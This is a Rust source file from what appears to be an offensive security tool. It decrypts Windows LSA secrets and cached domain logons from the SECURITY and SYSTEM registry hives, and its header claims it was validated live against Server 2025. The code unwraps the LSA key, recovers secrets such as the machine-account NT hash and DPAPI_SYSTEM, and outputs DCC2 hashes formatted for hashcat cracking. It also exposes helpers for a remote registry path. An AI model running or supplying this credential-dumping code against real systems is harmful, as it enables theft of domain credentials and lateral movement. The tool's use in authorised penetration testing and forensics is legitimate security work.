//! Offline LSA secrets + cached domain credentials (DCC2) from the SECURITY hive. Vista+ path:
//! the LSA key is unwrapped from `Policy\PolEKList` with the bootkey (SHA-256/AES-256), each
//! secret under `Policy\Secrets\*\CurrVal` is unwrapped with the LSA key, and cached logons in
//! `Cache\NL$*` are decrypted with the `NL$KM` secret (AES-128-CBC) into DCC2 (hashcat -m 2100).
//!
//! LIVE-VALIDATED vs Server 2025: `$MACHINE.ACC` decrypts to the machine-account NT hash that
//! matches DCSync of `DC01$` byte-for-byte, plus `DPAPI_SYSTEM`. The one non-obvious detail
//! (which the earlier blind attempt missed) is that impacket's `decryptAES` RE-INITIALIZES the
//! CBC cipher per 16-byte block when the IV is zero — i.e. the LSA key/secret unwrap is AES-256
//! **ECB** (no chaining), not chained CBC. Cached DCC2 creds use AES-128-CBC with the record IV
//! (a DC has none; that path needs a domain-joined member to exercise).

use crate::hive::Hive;
use crate::sam::bootkey;
use aes::cipher::generic_array::GenericArray;
use aes::cipher::{BlockDecrypt, KeyInit};
use sha2::{Digest, Sha256};

/// A decrypted LSA secret (raw plaintext bytes; caller interprets by `name`).
pub struct LsaSecret {
    pub name: String,
    pub secret: Vec<u8>,
}

/// A cached domain logon (DCC2 / MSCACHEV2).
pub struct CachedCred {
    pub username: String,
    pub domain: String,
    pub mscachev2: [u8; 16],
    pub iterations: u32,
}

impl CachedCred {
    /// hashcat -m 2100 format: `$DCC2$<iter>#<user>#<hash>`.
    pub fn dcc2_line(&self) -> String {
        format!(
            "$DCC2${}#{}#{}",
            self.iterations,
            self.username.to_lowercase(),
            hex::encode(self.mscachev2)
        )
    }
}

pub struct LsaDump {
    pub secrets: Vec<LsaSecret>,
    pub cached: Vec<CachedCred>,
}

/// Decrypt LSA secrets + cached credentials with an already-derived bootkey (e.g. from
/// `crate::rrp::bootkey_via_rrp`). Skips the SYSTEM hive entirely.
pub fn dump_with_bootkey(security: &Hive, bk: &[u8; 16]) -> Option<LsaDump> {
    let lsa_key = lsa_key(security, bk)?;

    let mut secrets = Vec::new();
    let mut nlkm: Option<Vec<u8>> = None;
    for name in security.subkey_names("Policy\\Secrets") {
        if name.eq_ignore_ascii_case("NL$Control") {
            continue;
        }
        let Some(enc) = security.value(&format!("Policy\\Secrets\\{name}\\CurrVal"), "") else {
            continue;
        };
        let Some(plain) = decrypt_secret(&lsa_key, &enc) else {
            continue;
        };
        if name.eq_ignore_ascii_case("NL$KM") {
            nlkm = Some(plain.clone());
        }
        secrets.push(LsaSecret {
            name,
            secret: plain,
        });
    }

    let mut cached = Vec::new();
    if let Some(nlkm) = nlkm {
        for name in security.value_names("Cache") {
            if !name.to_uppercase().starts_with("NL$") || name.eq_ignore_ascii_case("NL$Control") {
                continue;
            }
            let Some(rec) = security.value("Cache", &name) else {
                continue;
            };
            if let Some(c) = decrypt_cache(&nlkm, &rec) {
                cached.push(c);
            }
        }
    }
    Some(LsaDump { secrets, cached })
}

/// Decrypt LSA secrets + cached credentials from SYSTEM (for the bootkey) and SECURITY hives.
pub fn dump(system: &Hive, security: &Hive) -> Option<LsaDump> {
    let bk = bootkey(system)?;
    dump_with_bootkey(security, &bk)
}

/// Vista+ LSA key: unwrap `Policy\PolEKList` with the bootkey.
fn lsa_key(security: &Hive, bootkey: &[u8; 16]) -> Option<[u8; 32]> {
    let pol = security.value("Policy\\PolEKList", "")?;
    lsa_key_from_polekl(&pol, bootkey)
}

/// [`lsa_key`] taking the raw `Policy\PolEKList` value bytes — for the RRP path.
pub fn lsa_key_from_polekl(pol: &[u8], bootkey: &[u8; 16]) -> Option<[u8; 32]> {
    let enc = pol.get(28..)?;
    let plain = decrypt_lsa_blob(bootkey, enc)?;
    plain.get(68..100)?.try_into().ok()
}

/// Decrypt an LSA secret value (Vista+): SHA-256/AES-256, then take the LSA_SECRET_BLOB.Secret.
/// Public so `crate::rrp` can call it on values fetched via WINREG.
pub fn decrypt_secret_public(lsa_key: &[u8; 32], value: &[u8]) -> Option<Vec<u8>> {
    decrypt_secret(lsa_key, value)
}

/// Public wrapper for [`decrypt_cache`] — used by the RRP DCC2 path.
pub fn decrypt_cache_public(nlkm: &[u8], rec: &[u8]) -> Option<CachedCred> {
    decrypt_cache(nlkm, rec)
}

/// Decrypt an LSA secret value (Vista+): SHA-256/AES-256, then take the LSA_SECRET_BLOB.Secret.
fn decrypt_secret(lsa_key: &[u8; 32], value: &[u8]) -> Option<Vec<u8>> {
    let enc = value.get(28..)?; // LSA_SECRET header
    let plain = decrypt_lsa_blob(lsa_key, enc)?;
    let len = u32::from_le_bytes(plain.get(0..4)?.try_into().ok()?) as usize;
    plain.get(16..16 + len).map(|s| s.to_vec())
}

/// The Vista+ LSA unwrap: key' = SHA-256(key, data[..32] ×1000), then AES-256 of data[32..] with
/// a ZERO IV. impacket re-initializes the CBC cipher per 16-byte block when the IV is zero, which
/// is exactly ECB (no chaining) — the crucial detail; chained CBC yields garbage after block 1.
fn decrypt_lsa_blob(key: &[u8], enc: &[u8]) -> Option<Vec<u8>> {
    if enc.len() < 32 {
        return None;
    }
    let derived = sha256_rounds(key, &enc[..32]);
    Some(aes256_ecb_decrypt(&derived, &enc[32..]))
}

/// AES-256-ECB decrypt (per-block, no chaining) — the LSA zero-IV case.
fn aes256_ecb_decrypt(key: &[u8], data: &[u8]) -> Vec<u8> {
    let cipher = aes::Aes256::new(GenericArray::from_slice(key));
    let mut out = Vec::with_capacity(data.len());
    for block in data.chunks_exact(16) {
        let mut b = [0u8; 16];
        b.copy_from_slice(block);
        cipher.decrypt_block((&mut b).into());
        out.extend_from_slice(&b);
    }
    out
}

/// Decrypt one `Cache\NL$n` record into a DCC2 credential (Vista+ AES-128-CBC with the record IV).
fn decrypt_cache(nlkm: &[u8], rec: &[u8]) -> Option<CachedCred> {
    if rec.len() < 96 {
        return None;
    }
    let user_len = u16::from_le_bytes([rec[0], rec[1]]) as usize;
    let domain_len = u16::from_le_bytes([rec[2], rec[3]]) as usize;
    let iterations = u32::from_le_bytes([rec[52], rec[53], rec[54], rec[55]]); // IterationCount field
                                                                               // An empty slot has zero lengths / zero IV — skip.
    if user_len == 0 {
        return None;
    }
    let iv: [u8; 16] = rec[64..80].try_into().ok()?;
    let enc = &rec[96..];
    if enc.is_empty() {
        return None;
    }
    // Vista+: AES-128-CBC with the record IV. impacket keys with the raw NL$KM blob's [16:32],
    // which is the unwrapped Secret's first 16 bytes (the blob header is 16 bytes).
    let key = nlkm.get(0..16)?;
    let plain = aes_cbc_decrypt(key, &iv, enc);
    let mscachev2: [u8; 16] = plain.get(..16)?.try_into().ok()?;
    // Metadata (username, domain) begins at offset 0x48.
    let meta = plain.get(0x48..)?;
    let username = utf16(meta.get(..user_len)?);
    let dstart = (user_len + 3) & !3; // 4-byte align after the username
    let domain = meta
        .get(dstart..dstart + domain_len)
        .map(utf16)
        .unwrap_or_default();
    let iter = if (1024..=1_000_000).contains(&iterations) {
        iterations
    } else {
        10240
    };
    Some(CachedCred {
        username,
        domain,
        mscachev2,
        iterations: iter,
    })
}

fn utf16(b: &[u8]) -> String {
    let u: Vec<u16> = b
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&u)
}

fn sha256_rounds(key: &[u8], data: &[u8]) -> [u8; 32] {
    let mut h = Sha256::new();
    h.update(key);
    for _ in 0..1000 {
        h.update(data);
    }
    h.finalize().into()
}

/// AES-CBC decrypt (no padding), key length selects AES-128 or AES-256; whole 16-byte blocks.
fn aes_cbc_decrypt(key: &[u8], iv: &[u8; 16], data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len());
    let mut prev = *iv;
    let aes256 = (key.len() == 32).then(|| aes::Aes256::new(GenericArray::from_slice(key)));
    let aes128 = (key.len() >= 16 && key.len() != 32)
        .then(|| aes::Aes128::new(GenericArray::from_slice(&key[..16])));
    for block in data.chunks_exact(16) {
        let mut b = [0u8; 16];
        b.copy_from_slice(block);
        let ct = b;
        match (&aes256, &aes128) {
            (Some(c), _) => c.decrypt_block((&mut b).into()),
            (_, Some(c)) => c.decrypt_block((&mut b).into()),
            _ => return Vec::new(),
        }
        for i in 0..16 {
            b[i] ^= prev[i];
        }
        out.extend_from_slice(&b);
        prev = ct;
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sha256_rounds_is_deterministic() {
        let a = sha256_rounds(b"key", b"0123456789abcdef0123456789abcdef");
        let b = sha256_rounds(b"key", b"0123456789abcdef0123456789abcdef");
        assert_eq!(a, b);
        assert_ne!(a, [0u8; 32]);
    }

    #[test]
    fn dcc2_line_format() {
        let c = CachedCred {
            username: "Alice".into(),
            domain: "CORP".into(),
            mscachev2: [0xAB; 16],
            iterations: 10240,
        };
        assert_eq!(
            c.dcc2_line(),
            format!("$DCC2$10240#alice#{}", "ab".repeat(16))
        );
    }
}
